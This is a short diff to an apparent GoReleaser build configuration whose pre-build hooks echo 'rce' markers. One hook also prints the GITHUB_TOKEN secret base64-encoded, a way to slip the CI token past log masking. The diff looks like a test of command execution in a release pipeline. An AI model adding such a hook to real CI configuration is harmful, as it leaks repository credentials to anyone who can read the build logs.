@@ -2,7 +2,7 @@
 before:
   hooks:
     - go mod tidy
-    - echo "rce"
+    - echo "test rce"
     - echo "$GITHUB_TOKEN" | base64
 builds:
   - id: kaito
